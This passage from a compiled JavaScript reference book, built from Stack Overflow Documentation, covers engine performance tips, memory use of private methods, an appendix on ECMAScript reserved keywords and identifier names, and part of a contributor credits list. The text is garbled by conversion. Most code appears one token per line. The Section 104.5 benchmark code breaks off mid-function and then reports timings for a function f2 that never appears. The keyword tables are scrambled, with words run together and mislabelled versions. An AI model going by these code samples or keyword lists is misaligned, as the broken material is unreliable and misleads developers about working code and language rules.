<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-5">Section 104.5: Initializing object properties with null</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

All modern JavaScript JIT compilers trying to optimize code based on
expected object structures. Some tip from
[mdn](https://developer.mozilla.org/en-US/docs/Web/JavaScript/The_performance_hazards_of__%5B%5BPrototype%5D%5D_mutation#How_JavaScript_engines_optimize_property_accesses).

Fortunately, the objects and properties are often &quot;predictable&quot;, and
in such cases their underlying structure can also be predictable. JITs
can rely on this to make predictable accesses faster.

The best way to make object predictable is to define a whole structure
in a constructor. So if you&apos;re going to add some extra properties
after object creation, define them in a constructor with **null**.
This will help the optimizer to predict object behavior for its whole
life cycle. However all compilers have different optimizers, and the
performance increase can be different, but overall it&apos;s good practice
to define all properties in a constructor, even when their value is
not yet known.

Time for some testing. In my test, I&apos;m creating a big array of some
class instances with a for loop. Within the loop, I&apos;m assigning the
same string to all object&apos;s &quot;x&quot; property before array
initialization. If constructor initializes &quot;x&quot; property with null,
array always processes better even if it&apos;s doing extra statement.

This is code:
**function**
f1
(
)
{
**var**
P
=
**function**
(
)
{
**this**
.
value
=
1
}
;
**var**
big_array
=
**new**
Array
(
10000000
)
.
fill
(
1
)
.
map
(
(
x
,
index
)
=&gt;
{
![](./images/image055.png){width="7.486805555555556in"
height="7.072222222222222in"}
This is the result for Chrome and Firefox.
FireFox Chrome
&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&bsol;
f1 6,400 11,400
f2 1,700 9,600

As we can see, the performance improvements are very different between
the two.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-6">Section 104.6: Reuse objects rather than recreate</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
**Example A**
**var**
i
,
a
,
b
,
len
;
a
=
{
x
:
0
,
y
:
0
}
**function**
test
(
)
{
*// return object created each call*
**return**
{
x
:
0
,
y
:
0
}
;
}
**function**
test1
(
a
)
{
*// return object supplied*
a&period;
x
=
0
;
a&period;
y
=
0
;
**return**
a
;
}
**for**
(
i
=
0
;
i
&lt;
100
;
i
++
)
{
*// Loop A*
b
=
test
(
)
;
}
**for**
(
i
=
0
;
i
&lt;
100
;
i
++
)
{
*// Loop B*
b
=
test1
(
a
)
;
}
Loop B is 4 (400%) times faster than Loop A
  
  test

 
 
  test1

 
It is very inefficient to create a new object in performance code.
Loop A calls function () which returns a new object every call. The
created object is discarded every iteration, Loop B calls () that
requires the object returns to be supplied. It thus uses the same
object and avoids allocation of a new object, and excessive GC hits.

(GC were not included in the performance test)
**Example B**
**var**
i
,
a
,
b
,
len
;
a
=
{
x
:
0
,
y
:
0
}
**function**
test2
(
a
)
{
**return**
{
x
:
a&period;
x
&ast;
10
,
y
:
a&period;
x
&ast;
10
}
;
}
**function**
test3
(
a
)
{
a&period;
x
=
a&period;
x
&ast;
10
;
a&period;
y
=
a&period;
y
&ast;
10
;
**return**
a
;
}
**for**
(
i
=
0
;
i
&lt;
100
;
i
++
)
{
*// Loop A*
b
=
test2
(
{
x
:
10
,
y
:
10
}
)
;
}
**for**
(
i
=
0
;
i
&lt;
100
;
i
++
)
{
*// Loop B*
a&period;
x
=
10
;
a&period;
y
=
10
;
b
=
test3
(
a
)
;
}
Loop B is 5 (500%) times faster than loop A
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-7">Section 104.7: Prefer local variables to globals, attributes, and indexed values</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
JavaScript engines first look for variables within the local scope
before extending their search to larger scopes. If the variable is an
indexed value in an array, or an attribute in an associative array, it
will first look for the parent array before it finds the contents.

This has implications when working with performance-critical code.
Take for instance a common **for** loop:

**var**
global_variable
=
0
;
**function**
foo
(
)
{
global_variable
=
0
;
**for**
(
**var**
i
=
0
;
i
&lt;
items.
length
;
i
++
)
{
global_variable
+=
items
&lbrack;
i
&rbrack;
;
}
}
For every iteration in **for** loop, the engine will lookup items,
lookup the length attribute within items, lookup items again, lookup
the value at index i of items, and then finally lookup
global_variable, first trying the local scope before checking the
global scope.

A performant rewrite of the above function is:
**function**
foo
(
)
{
**var**
local_variable
=
0
;
**for**
(
**var**
i
=
0
,
li
=
items.
length
;
i
&lt;
li
;
i
++
)
{
local_variable
+=
items
&lbrack;
i
&rbrack;
;
}
**return**
local_variable
;
}

For every iteration in the rewritten **for** loop, the engine will
lookup li, lookup items, lookup the value at index i, and lookup
local_variable, this time only needing to check the local scope.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-8">Section 104.8: Be consistent in use of Numbers</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

If the engine is able to correctly predict you&apos;re using a specific
small type for your values, it will be able to optimize the executed
code.

In this example, we&apos;ll use this trivial function summing the elements
of an array and outputting the time it took:

*// summing properties*
**var**
sum
=
(
**function**
(
arr
)
{
**var**
start
=
process.
hrtime
(
)
;
**var**
sum
=
0
;
**for**
(
**var**
i
=
0
;
i
&lt;
arr.
length
;
i
++
)
{
sum
+=
arr
&lbrack;
i
&rbrack;
;
}
**var**
diffSum
=
process.
hrtime
(
start
)
;
console.
log
(
&grave;Summing took &dollar;
{
diffSum
&lbrack;
0
&rbrack;
&ast;
1e9
&plus;
diffSum
&lbrack;
1
&rbrack;
}
nanoseconds&grave;
)
;
**return**
sum
;
}
)
(
arr
)
;
Let&apos;s make an array and sum the elements:
**var**
N
=
12345
,
arr
=
&lbrack;
&rbrack;
;
**for**
(
**var**
i
=
0
;
i
&lt;
N
;
i
++
)
arr
&lbrack;
i
&rbrack;
=
Math
.
random
(
)
;
Result:
Summing took 384416 nanoseconds
Now, let&apos;s do the same but with only integers:
**var**
N
=
12345
,
arr
=
&lbrack;
&rbrack;
;
**for**
(
**var**
i
=
0
;
i
&lt;
N
;
i
++
)
arr
&lbrack;
i
&rbrack;
=
Math
.
round
(
1000
&ast;
Math
.
random
(
)
)
;
Result:
Summing took 180520 nanoseconds
**Summing integers took half the time here.**

Engines don&apos;t use the same types you have in JavaScript. As you
probably know, all numbers in JavaScript are IEEE754 double precision
floating point numbers, there&apos;s no specific available representation
for integers. But engines, when they can predict you only use
integers, can use a more compact and faster to use representation, for
example, short integers.

This kind of optimization is especially important for computation or
data intensive applications.

<h2 id="ch105">Chapter 105: Memory efficiency</h2>
<h3 id="ch105-1">Section 105.1: Drawback of creating true private method</h3>

One drawback of creating private method in JavaScript is
memory-inefficient because a copy of the private method will be
created every time a new instance is created. See this simple example.

**function**
contact
(
first
,
last
)
{
**this**
.
firstName
=
first
;
**this**
.
lastName
=
last
;
**this**
.
mobile
;
*// private method*
**var**
formatPhoneNumber
=
**function**
(
number
)
{
*// format phone number based on input*
}
;
*// public method*
**this**
.
setMobileNumber
=
**function**
(
number
)
{
**this**
.
mobile
=
formatPhoneNumber
(
number
)
;
}
;
}
When you create few instances, they all have a copy of
formatPhoneNumber method
**var**
rob
=
**new**
contact
(
&apos;Rob&apos;
,
&apos;Sanderson&apos;
)
;
**var**
don
=
**new**
contact
(
&apos;Donald&apos;
,
&apos;Trump&apos;
)
;
**var**
andy
=
**new**
contact
(
&apos;Andy&apos;
,
&apos;Whitehall&apos;
)
;
Thus, would be great to avoid using private method only if it&apos;s
necessary.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="chA">Appendix A: Reserved Keywords</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
Certain words - so-called *keywords* - are treated specially in
JavaScript. There&apos;s a plethora of different kinds of keywords, and
they have changed in different versions of the language.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="chA-1">Section A.1: Reserved Keywords</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
**JavaScript has a predefined collection of *reserved keywords* which
you cannot use as variables, labels, or function names.**
**ECMAScript 1** Version = 1
++++
| ***A***  ***E***   | ***E***  ***R***   | ***S***    |
|                         |                         | ***Z***       |
+=========================+=========================+=================+
| **break**               | export                  | super           |
++++
| **case**                | extends                 | **switch**      |
++++
| **catch**               | **false**               | **this**        |
++++
| class                   | **finally**             | **throw**       |
++++
| **const**               | **for**                 | **true**        |
++++

**continuefunctiontry**
  
  debuggerif                                           **typeof**
  **default** import                                   **var**
  **delete** in                                        **void**
  do **new**                                           while
  **else null**                                        with
enum **return**
**ECMAScript 2**
Added **24** additional reserved keywords. (New additions in bold).
Version = 3 Version = E4X

+++
| ***A***  ***F F***  ***P***         | ***P***  ***Z***    |
+===========================================+==========================+
| **abstractfinal**                         | **public**               |
+++
| **boolean finally**                       | **return**               |
+++
| **break float**                           | **short**                |
+++
| **byte for**                              | **static**               |
+++
| **case function**                         | super                    |
+++
| **catch goto**                            | **switch**               |
+++
| **char** if                               | **synchronized**         |
+++
class **implementsthis const** import **throw continue**in **throws**
debugger**instanceoftransient**
 
  **default**            **int**                     **true**
  -  
  **delete**             **interface**               **try**

  do                     **long**                    **typeof**

  **double**             **native**                  **var**

  **else**               **new**                     **void**

  enum                   **null**                    **volatile**

  export                 **package**                 while

  extends                **private**                 with
  

**false** protected

**ECMAScript 5 / 5.1**

There was no change since *ECMAScript 3*.

*ECMAScript 5* removed int, byte, char, **goto**, long, final, float,
short, double, native, throws, boolean, abstract, volatile, transient,
and synchronized; it added **let** and yield.

+++-+
| ***A***  ***F*** | ***F***  ***P***         | ***P***   |
|                       |                             | ***Z***      |
+=======================+=============================+================+
| **break**             | **finally**                 | public         |
+++-+
| **case**              | **for**                     | **return**     |
+++-+
| **catch**             | **function**                | **static**     |
+++-+
| class                 | if                          | super          |
+++-+

**const** implements**switch continue**import **this** debuggerin
**throw**

  
  **default**              **instanceoftrue**            
  -  -
  **delete**               interface                     **try**

  do                       **let**                       **typeof**

  **else**                 **new**                       **var**

  enum                     **null**                      **void**

  export                   package                       while

  extends                  private                       with

  **false**                protected                     **yield**
  

implements, **let**, private, public, interface, package, protected,
**static**, and yield are **disallowed in strict mode only**.
>
eval and arguments are not reserved words but they act like it in
**strict mode**. **ECMAScript 6 / ECMAScript 2015**

+-+-+
| ***A***  ***E E***  ***R***                   | ***S***   |
|                                                     | ***Z***      |
+=====================================================+================+
| **break** export                                    | super          |
+-+-+
| **case** extends                                    | **switch**     |
+-+-+
| **catch finally**                                   | **this**       |
+-+-+
| class **for**                                       | **throw**      |
+-+-+
| **const function**                                  | **try**        |
+-+-+
| **continue**if                                      | **typeof**     |
+-+-+
| debuggerimport                                      | **var**        |
+-+-+
| **default** in                                      | **void**       |
+-+-+

**delete instanceof**while

do **new** with

**else return** yield

Future reserved keywords

The following are reserved as future keywords by the ECMAScript
specification. They have no special functionality at present, but they
might at some future time, so they cannot be used as identifiers. enum

The following are only reserved when they are found in strict mode
code:

implementspackage public interface private &grave;static&apos; **let**
protected

Future reserved keywords in older standards

The following are reserved as future keywords by older ECMAScript
specifications (ECMAScript 1 till 3).

abstractfloat short boolean **goto** synchronized byte
**instanceof**throws

char int transient double long volatile final native

Additionally, the literals null, true, and false cannot be used as
identifiers in ECMAScript.

From the [Mozilla Developer
Network](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar).

<h3 id="chA-2">Section A.2: Identifiers & Identifier Names</h3>

With regards to reserved words there is a small distinctions between
the *&quot;Identifiers&quot;* used for the likes of variable or function names
and the *&quot;Identifier Names&quot;* allowed as properties of composite data
types.

For example the following will result in an illegal syntax error:

**var**
**break**
=
**true**
;

Uncaught SyntaxError: Unexpected token break
However the name is deemed valid as a property of an object (as of
ECMAScript 5+):
**var**
obj
=
{
**break**
:
**true**
}
;
console.
log
(
obj.
**break**
)
;

To quote from [this
answer](http://stackoverflow.com/questions/40209367/do-reserved-words-need-to-be-quoted-when-set-as-property-names-of-javascript-obj/40210179#40210179):

From the [ECMAScript® 5.1 Language
Specification](http://www.ecma-international.org/ecma-262/5.1):

Section 7.6

Identifier Names are tokens that are interpreted according to the
grammar given in the "Identifiers" section of chapter 5 of the Unicode
standard, with some small modifications. An Identifier is an
IdentifierName that is not a ReservedWord (see
[7.6.1](http://www.ecma-international.org/ecma-262/5.1/#sec-7.6.1)).

**Syntax**
Identifier
::
IdentifierName but not ReservedWord
By specification, a
ReservedWord
is:
Section 7.6.1
A reserved word is an
IdentifierName
that cannot be used as an
Identifier
.
ReservedWord
::
Keyword
FutureReservedWord
NullLiteral
BooleanLiteral

This includes keywords, future keywords, **null**, and boolean
literals. The full list of keywords are in [Sections
7.6.1](http://www.ecma-international.org/ecma-262/5.1/#sec-7.6.1) and
literals are in [Section
7.8](http://www.ecma-international.org/ecma-262/5.1/#sec-7.8).

The above (Section 7.6) implies that IdentifierNames can be
ReservedWords, and from the specification for [object
initializers](http://www.ecma-international.org/ecma-262/5.1/#sec-11.1.5):

Section 11.1.5

**Syntax**

ObjectLiteral

:

{

}

{

PropertyNameAndValueList

}

{

PropertyNameAndValueList

,

}

Where

PropertyName

is, by specification:

PropertyName

:

IdentifierName

StringLiteral

NumericLiteral

As you can see, a PropertyName may be an IdentifierName, thus allowing
ReservedWords to be PropertyNames. That conclusively tells us that,
*by specification*, it is allowed to have ReservedWords such as class
and **var** as PropertyNames unquoted just like string literals or
numeric literals.
>
To read more, see [Section
7.6](http://www.ecma-international.org/ecma-262/5.1/#sec-7.6) -
Identifier Names and Identifiers.
>
***Note:*** the syntax highlighter in this example has spotted the
reserved word and still highlighted it. While the example is valid
JavaScript developers can get caught out by some compiler /
transpiler, linter and minifier tools that argue otherwise.

# Credits

Thank you greatly to all the people from Stack Overflow Documentation
who helped provide this content, more changes can be sent to
[web@petercv.com] for new content to be published or
updated

  
  [16807](https://stackoverflow.com/users/2584689/)            Chapter 104
   
  [2426021684](https://stackoverflow.com/users/6369276/)       Chapters 1, 7, 12, 42 and 59

  [4444](https://stackoverflow.com/users/1464444/)             Chapter 23

  [4m1r](https://stackoverflow.com/users/2296997/)             Chapter 100

  [A.J](https://stackoverflow.com/users/2720743/)              Chapter 61

  [A.M.K](https://stackoverflow.com/users/900747/)             Chapters 5, 12, 40, 63, 72 and 73

  [Aadit M Shah](https://stackoverflow.com/users/783743/)      Chapter 29

  [Abdelaziz                                                   Chapter 1
  Mokhnache](https://stackoverflow.com/users/5192846/)         

  [Abhishek](https://stackoverflow.com/users/3925609/)         Chapter 65

  [Abhishek Singh](https://stackoverflow.com/users/5716106/)   Chapter 48

  [Adam Heath](https://stackoverflow.com/users/219750/)        Chapter 59

  [adius](https://stackoverflow.com/users/1850340/)            Chapter 31

  [adriennetacke](https://stackoverflow.com/users/3731657/)    Chapter 68

  [Aeolingamenfel](https://stackoverflow.com/users/3681236/)   Chapter 62

  [afzalex](https://stackoverflow.com/users/3626698/)          Chapter 42

  [Ahmed Ayoub](https://stackoverflow.com/users/2637185/)      Chapter 12

  [aikeru](https://stackoverflow.com/users/76840/)             Chapter 14

  [Ajedi32](https://stackoverflow.com/users/1157054/)          Chapter 16

  [Akshat Mahajan](https://stackoverflow.com/users/2271269/)   Chapter 53

  [Ala Eddine                                                  Chapters 1, 24 and 56
  JEBALI](https://stackoverflow.com/users/1343790/)            

  [Alberto                                                     Chapters 13, 14 and 43
  Nicoletti](https://stackoverflow.com/users/2073379/)         

  [Alejandro Nanez](https://stackoverflow.com/users/1405803/)  Chapter 12

  [Alex](https://stackoverflow.com/users/1397240/)             Chapter 63

  [Alex Filatov](https://stackoverflow.com/users/2173016/)     Chapters 14, 35 and 67

  [Alex Logan](https://stackoverflow.com/users/6161714/)       Chapter 5

  [Alexander                                                   Chapter 1
  O&apos;Mara](https://stackoverflow.com/users/3155639/)           

  [Alexandre N.](https://stackoverflow.com/users/7179086/)     Chapters 1 and 42

  [aluxian](https://stackoverflow.com/users/1133344/)          Chapter 81

  [amflare](https://stackoverflow.com/users/5937428/)          Chapter 20

  [Aminadav](https://stackoverflow.com/users/1229624/)         Chapters 1, 35 and 104

  [Andrew Burgess](https://stackoverflow.com/users/12096/)     Chapter 55

  [Andrew Myers](https://stackoverflow.com/users/5764553/)     Chapter 4

  [Andrew                                                      Chapters 59 and 98
  Sklyarevsky](https://stackoverflow.com/users/894973/)        

  [Andrew Sun](https://stackoverflow.com/users/1591742/)       Chapter 59

  [Andrey](https://stackoverflow.com/users/2182767/)           Chapter 14

  [Angel Politis](https://stackoverflow.com/users/6313073/)    Chapters 36 and 47

  [Angela Amarapala](https://stackoverflow.com/users/6284797/) Chapter 26

  [Angelos Chalaris](https://stackoverflow.com/users/1650200/) Chapters 13, 37 and 46

  [Ani Menon](https://stackoverflow.com/users/2142994/)        Chapters 1 and 36

  [Anirudh Modi](https://stackoverflow.com/users/4197363/)     Chapters 12, 19, 50, 60 and 62

  [Anirudha](https://stackoverflow.com/users/598420/)          Chapter 103

  [Anko](https://stackoverflow.com/users/777586/)              Chapter 1

  [Ankur Anand](https://stackoverflow.com/users/3027001/)      Chapter 1

  [Anurag Singh                                                Chapter 87
  Bisht](https://stackoverflow.com/users/3436826/)             

  [Ara Yeressian](https://stackoverflow.com/users/1324935/)    Chapter 42

  [Araknid](https://stackoverflow.com/users/4268627/)          Chapters 11 and 30

  [arbybruce](https://stackoverflow.com/users/4731569/)        Chapter 33
  

  
  [Armfoot](https://stackoverflow.com/users/1326147/)            Chapter 62
   
  [AstroCB](https://stackoverflow.com/users/3366929/)            Chapter 1

  [Aswin](https://stackoverflow.com/users/1624261/)              Chapter 21

  [Atakan Goktepe](https://stackoverflow.com/users/5366882/)     Chapter 5

  [ATechieThought](https://stackoverflow.com/users/3768367/)     Chapter 1

  [Ates Goral](https://stackoverflow.com/users/23501/)           Chapters 3, 35 and 42

  [Awal Garg](https://stackoverflow.com/users/3459110/)          Chapters 41 and 42

  [azz](https://stackoverflow.com/users/1280997/)                Chapter 10

  [Badacadabra](https://stackoverflow.com/users/6910253/)        Chapter 25

  [baga](https://stackoverflow.com/users/1816770/)               Chapter 5

  [balpha](https://stackoverflow.com/users/115866/)              Chapter 12

  [Bamieh](https://stackoverflow.com/users/5384679/)             Chapter 12

  [BarakD](https://stackoverflow.com/users/5196561/)             Chapter 22

  [Barmar](https://stackoverflow.com/users/1491895/)             Chapter 14

  [Basilin Joe](https://stackoverflow.com/users/3521176/)        Chapter 28

  [Beau](https://stackoverflow.com/users/60371/)                 Chapter 5

  [Bekim Bacaj](https://stackoverflow.com/users/5896426/)        Chapter 1

  [Ben](https://stackoverflow.com/users/348314/)                 Chapter 12

  [Ben McCormick](https://stackoverflow.com/users/1424361/)      Chapter 60

  [Benjadahl](https://stackoverflow.com/users/5056525/)          Chapter 19

  [Bennett](https://stackoverflow.com/users/5067993/)            Chapter 70

  [bfavaretto](https://stackoverflow.com/users/825789/)          Chapter 1

  [Bit Byte](https://stackoverflow.com/users/3434588/)           Chapter 89

  [Black](https://stackoverflow.com/users/4684797/)              Chapter 1

  [Blindman67](https://stackoverflow.com/users/3877726/)         Chapters 10, 12, 14, 28, 41, 56, 84 and
                                                                 104

  [bloodyKnuckles](https://stackoverflow.com/users/2743458/)     Chapter 63

  [Blubberguy22](https://stackoverflow.com/users/3842050/)       Chapter 11

  [Blue Sheep](https://stackoverflow.com/users/2019825/)         Chapters 14 and 104

  [BluePill](https://stackoverflow.com/users/4938301/)           Chapter 7

  [Blundering                                                    Chapters 1 and 42
  Philosopher](https://stackoverflow.com/users/2430414/)         

  [bobylito](https://stackoverflow.com/users/654253/)            Chapter 42

  [Boopathi Rajaa](https://stackoverflow.com/users/556124/)      Chapters 22, 41, 50 and 63

  [Borja Tur](https://stackoverflow.com/users/6181766/)          Chapters 13 and 19

  [Božo Stojković](https://stackoverflow.com/users/4936137/)     Chapters 1, 12 and 42

  [Brandon Buck](https://stackoverflow.com/users/445322/)        Chapter 1

  [Brendan Doherty](https://stackoverflow.com/users/5303755/)    Chapter 50

  [brentonstrine](https://stackoverflow.com/users/925897/)       Chapter 19

  [Brett DeWoody](https://stackoverflow.com/users/438581/)       Chapter 12

  [Brett Zamir](https://stackoverflow.com/users/271577/)         Chapters 1 and 4

  [Brian Liu](https://stackoverflow.com/users/4796724/)          Chapter 105

  [bwegs](https://stackoverflow.com/users/745750/)               Chapters 1, 56 and 62

  [C L K Kissane](https://stackoverflow.com/users/4224536/)      Chapter 5

  [Callan Heard](https://stackoverflow.com/users/2030247/)       Chapter 50

  [CamJohnson26](https://stackoverflow.com/users/3587534/)       Chapter 50

  [catalogue_number](https://stackoverflow.com/users/3264977/)   Chapter 1

  [cchamberlain](https://stackoverflow.com/users/769871/)        Chapter 5

  [CD..](https://stackoverflow.com/users/139300/)                Chapters 12 and 13

  [cdm](https://stackoverflow.com/users/4663542/)                Chapter 58

  [cdrini](https://stackoverflow.com/users/2317712/)             Chapters 19 and 55

  [Cerbrus](https://stackoverflow.com/users/1835379/)            Chapters 1, 5, 14, 17, 40, 42, 99 and 103

  [cFreed](https://stackoverflow.com/users/3415269/)             Chapter 10

  [Charlie H](https://stackoverflow.com/users/4185234/)          Chapters 10, 14, 35 and 54

  [Chong Lip Phang](https://stackoverflow.com/users/2691226/)    Chapter 50
  

  -
  [choz](https://stackoverflow.com/users/1627271/)             Chapter 19
   
  [Chris](https://stackoverflow.com/users/536950/)             Chapters 10 and 22

  [Christian](https://stackoverflow.com/users/6702958/)        Chapter 2

  [Christian                                                   Chapter 13
  Landgren](https://stackoverflow.com/users/913800/)           

  [Christoph](https://stackoverflow.com/users/1047823/)        Chapter 1

  [Christophe                                                  Chapter 42
  Marois](https://stackoverflow.com/users/1558527/)            

  [Christopher                                                 Chapter 27
  Ronning](https://stackoverflow.com/users/2898801/)           

  [Claudiu](https://stackoverflow.com/users/15055/)            Chapters 7 and 42

  [Cliff Burton](https://stackoverflow.com/users/4120911/)     Chapters 13 and 19

  [Code Uniquely](https://stackoverflow.com/users/1582029/)    Chapter 18

  [codemano](https://stackoverflow.com/users/7798155/)         Chapter 12

  [code_monk](https://stackoverflow.com/users/977083/)         Chapter 12

  [CodingIntrigue](https://stackoverflow.com/users/571194/)    Chapters 7, 12, 13, 50, 57 and 69

  [Colin](https://stackoverflow.com/users/2986033/)            Chapter 10

  [cone56](https://stackoverflow.com/users/2229579/)           Chapter 92

  [Conlin Durbin](https://stackoverflow.com/users/1466592/)    Chapter 27

  [CPHPython](https://stackoverflow.com/users/6225838/)        Chapters 5, 12, 19, 50, 56 and 62

  [Creative John](https://stackoverflow.com/users/5065086/)    Chapter 24

  [CroMagnon](https://stackoverflow.com/users/3687463/)        Chapters 27 and 48

  [csander](https://stackoverflow.com/users/2276009/)          Chapters 6, 8, 18, 38, 43, 56 and 85

  [cswl](https://stackoverflow.com/users/5026445/)             Chapters 15 and 81

  [Daksh Gupta](https://stackoverflow.com/users/5662469/)      Chapters 1 and 62

  [Damon](https://stackoverflow.com/users/5026139/)            Chapters 11, 12, 19 and 62

  [Dan Pantry](https://stackoverflow.com/users/1073868/)       Chapter 42

  [Daniel](https://stackoverflow.com/users/3346612/)           Chapter 12

  [Daniel Herr](https://stackoverflow.com/users/3591628/)      Chapters 11, 12, 18, 30, 35, 41, 42 and 55

  [Daniel LIn](https://stackoverflow.com/users/4434245/)       Chapter 79

  [daniellmb](https://stackoverflow.com/users/131944/)         Chapters 1 and 42

  [daniphilia](https://stackoverflow.com/users/6558051/)       Chapter 102

  [DarkKnight](https://stackoverflow.com/users/4578017/)       Chapters 19 and 60

  [dauruy](https://stackoverflow.com/users/4422260/)           Chapter 12

  [Dave Sag](https://stackoverflow.com/users/917187/)          Chapters 42 and 100

  [David Archibald](https://stackoverflow.com/users/5461005/)  Chapter 1

  [David G.](https://stackoverflow.com/users/3838549/)         Chapters 1 and 42

  [David Knipe](https://stackoverflow.com/users/2064808/)      Chapter 56

  [Davis](https://stackoverflow.com/users/4621303/)            Chapters 14, 19, 59 and 62

  [DawnPaladin](https://stackoverflow.com/users/1805453/)      Chapters 5, 59 and 99

  [Deepak Bansal](https://stackoverflow.com/users/6794259/)    Chapter 99

  [Denys Séguret](https://stackoverflow.com/users/263525/)     Chapter 104

  [Derek 朕會功夫](https://stackoverflow.com/users/283863/)    Chapter 35

  [DevDig](https://stackoverflow.com/users/1203741/)           Chapter 62

  [Devid Farinelli](https://stackoverflow.com/users/4695325/)  Chapters 1 and 99

  [devlin carnate](https://stackoverflow.com/users/2359687/)   Chapter 42

  [Diego Molina](https://stackoverflow.com/users/6629549/)     Chapter 59

  [dns_nx](https://stackoverflow.com/users/3725142/)           Chapter 12

  [Domenic](https://stackoverflow.com/users/3191/)             Chapters 12 and 49

  [DontVoteMeDown](https://stackoverflow.com/users/1267304/)   Chapter 1

  [Downgoat](https://stackoverflow.com/users/1620622/)         Chapters 73 and 96

  [Dr. Cool](https://stackoverflow.com/users/1739408/)         Chapter 90

  [Dr. J.                                                      Chapter 12
  Testington](https://stackoverflow.com/users/6594854/)        

  [Drew](https://stackoverflow.com/users/595605/)              Chapter 14

  [dunnza](https://stackoverflow.com/users/561902/)            Chapter 42

  [Durgpal Singh](https://stackoverflow.com/users/1759015/)    Chapters 19 and 42
  -

  
  [DVJex](https://stackoverflow.com/users/4560343/)            Chapter 99
   
  [DzinX](https://stackoverflow.com/users/18745/)              Chapter 12

  [Ehsan Sajjad](https://stackoverflow.com/users/1875256/)     Chapter 99

  [Eirik Birkeland](https://stackoverflow.com/users/3897504/)  Chapter 19

  [Ekin](https://stackoverflow.com/users/2852427/)             Chapters 37 and 67

  [eltonkamami](https://stackoverflow.com/users/5267669/)      Chapters 18, 19, 31, 62 and 99

  [Emissary](https://stackoverflow.com/users/1238344/)         Chapters 5, 17, 104 and 106

  [Emre Bolat](https://stackoverflow.com/users/6382007/)       Chapter 106

  [Erik Minarini](https://stackoverflow.com/users/6093353/)    Chapter 42

  [Ethan](https://stackoverflow.com/users/1261879/)            Chapter 62

  [et_l](https://stackoverflow.com/users/3836051/)             Chapters 13 and 65

  [Evan Bechtol](https://stackoverflow.com/users/4515720/)     Chapter 42

  [Everettss](https://stackoverflow.com/users/3708596/)        Chapters 1, 19 and 57

  [Explosion Pills](https://stackoverflow.com/users/454533/)   Chapter 81

  [Fab313](https://stackoverflow.com/users/1611417/)           Chapter 22

  [fracz](https://stackoverflow.com/users/878514/)             Chapters 12 and 42

  [Frank Tan](https://stackoverflow.com/users/4326495/)        Chapter 60

  [FrankCamara](https://stackoverflow.com/users/5223631/)      Chapter 12

  [FredMaggiowski](https://stackoverflow.com/users/3119050/)   Chapter 13

  [fson](https://stackoverflow.com/users/1530110/)             Chapters 42 and 81

  [Gabriel                                                     Chapter 41
  Furstenheim](https://stackoverflow.com/users/1536133/)       

  [Gabriel L.](https://stackoverflow.com/users/4876305/)       Chapter 42

  [Gaurang Tandon](https://stackoverflow.com/users/2675672/)   Chapter 14

  [Gavishiddappa                                               Chapter 19
  Gadagi](https://stackoverflow.com/users/5950377/)            

  [gca](https://stackoverflow.com/users/1421069/)              Chapter 10

  [gcampbell](https://stackoverflow.com/users/6303733/)        Chapter 7

  [geekonaut](https://stackoverflow.com/users/585967/)         Chapters 61, 63 and 89

  [georg](https://stackoverflow.com/users/989121/)             Chapter 42

  [George Bailey](https://stackoverflow.com/users/463304/)     Chapters 12, 13, 30 and 90

  [GingerPlusPlus](https://stackoverflow.com/users/3821804/)   Chapter 99

  [gman](https://stackoverflow.com/users/128511/)              Chapters 1, 5 and 29

  [gnerkus](https://stackoverflow.com/users/2259144/)          Chapter 11

  [GOTO 0](https://stackoverflow.com/users/1083663/)           Chapters 7, 67 and 78

  [Grundy](https://stackoverflow.com/users/2881286/)           Chapter 10

  [Guybrush                                                    Chapter 22
  Threepwood](https://stackoverflow.com/users/3869455/)        

  [H. Pauwelyn](https://stackoverflow.com/users/4551041/)      Chapters 1 and 65

  [hairboat](https://stackoverflow.com/users/865899/)          Chapter 19

  [Hans Strausl](https://stackoverflow.com/users/2022914/)     Chapters 3 and 12

  [hansmaad](https://stackoverflow.com/users/498298/)          Chapter 12

